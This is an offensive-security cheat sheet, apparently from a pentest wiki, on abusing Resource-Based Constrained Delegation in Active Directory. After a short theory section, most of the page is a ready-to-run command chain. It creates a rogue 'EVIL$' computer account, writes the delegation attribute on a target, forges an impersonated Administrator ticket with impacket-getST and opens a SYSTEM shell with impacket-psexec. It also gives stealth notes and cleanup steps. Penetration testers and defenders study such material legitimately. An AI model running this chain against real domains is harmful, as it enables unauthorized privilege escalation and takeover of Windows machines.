# 🪝 Resource-Based Constrained Delegation (RBCD)

## Theory

RBCD moves the trust decision to the **target**: a computer's
**`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute lists the principals allowed to
delegate **to** it. If you can **write** that attribute (you have `GenericWrite`,
`GenericAll`, `WriteDacl`, or `WriteOwner` over the computer object), point it at an account
**you control that has an SPN**, then run S4U2Self + S4U2Proxy to impersonate any user to
the target - landing as local admin / SYSTEM.

::: details

| Aspect         | Value                                                                  |
| -------------- | ---------------------------------------------------------------------- |
| **Scope**      | The target computer's services, as **any** impersonated user           |
| **Needs**      | Write over the target's object + a controlled principal with an SPN     |
| **Stealth**    | Medium - creates a computer account and writes an ACL attribute        |
| **Use when**   | You have an ACL write over a computer (BloodHound `AllowedToAct` edge)  |
| **Avoid when** | You have no write on the target (-> find another ACL path first)       |

:::

**Why it works** - unlike classic constrained delegation (set by Domain Admins on the
*source*), RBCD is configured on the *target* and can be set by anyone with write access to
it. A computer account you create has an SPN by default, which is exactly what S4U requires.

## Practice

### Requirements

::: details

| Requirement                | How to get it                                                 |
| -------------------------- | ------------------------------------------------------------- |
| Write over the target object | `GenericWrite`/`GenericAll`/`WriteDacl`/`WriteOwner` (BloodHound) |
| A controlled SPN account   | Create a computer (MachineAccountQuota) or own an SPN account  |

:::

### Create a controlled computer account

```bash
# Default MachineAccountQuota = 10 lets any domain user create a computer
nxc ldap $DC_IP -u $USER -p $PASSWORD -M maq                  # check the quota first

impacket-addcomputer -computer-name 'EVIL$' -computer-pass $COMPUTER_PASSWORD \
  -dc-ip $DC_IP $DOMAIN/$USER:$PASSWORD
```

### Write the delegation attribute on the target

```bash
# Allow EVIL$ to delegate to the target computer
impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'EVIL$' -action write \
  -dc-ip $DC_IP $DOMAIN/$USER:$PASSWORD
```

```powershell
# PowerView alternative
Set-ADComputer -Identity TARGET -PrincipalsAllowedToDelegateToAccount 'EVIL$'
```

### S4U - impersonate a privileged user to the target

```bash
impacket-getST -spn cifs/$TARGET_FQDN -impersonate Administrator -dc-ip $DC_IP \
  $DOMAIN/'EVIL$':$COMPUTER_PASSWORD
```

### Use the ticket

```bash
export KRB5CCNAME=Administrator@cifs_$TARGET_FQDN@$DOMAIN.ccache
impacket-psexec -k -no-pass $DOMAIN/Administrator@$TARGET_FQDN
```

> [!tip] Clean up
> Remove the attribute and the computer you created once done - they are durable artifacts:
>
> ```bash
> impacket-rbcd -delegate-to 'TARGET$' -action flush -dc-ip $DC_IP $DOMAIN/$USER:$PASSWORD
> impacket-addcomputer -computer-name 'EVIL$' -action delete -dc-ip $DC_IP $DOMAIN/$USER:$PASSWORD
> ```
